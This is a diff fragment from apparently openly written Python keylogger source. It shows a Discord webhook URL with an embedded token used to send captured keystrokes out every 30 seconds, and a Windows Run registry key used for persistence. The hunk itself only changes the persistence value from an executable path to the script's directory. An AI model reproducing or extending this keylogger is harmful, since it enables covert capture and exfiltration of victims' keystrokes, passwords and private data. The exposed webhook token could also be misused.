@@ -9,7 +9,8 @@ WEBHOOK_URL = 'https://discord.com/api/webhooks/1119333967980679218/Th_zESq80saK
 TIME_INTERVAL = 30  # Amount of time between each report, expressed in seconds.
 KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 VALUE_NAME = "test"
-VALUE_DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test.exe")
+# VALUE_DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test.exe")
+VALUE_DATA = os.path.dirname(os.path.abspath(__file__))
 
 class Keylogger:
     def __init__(self, webhook_url, interval):
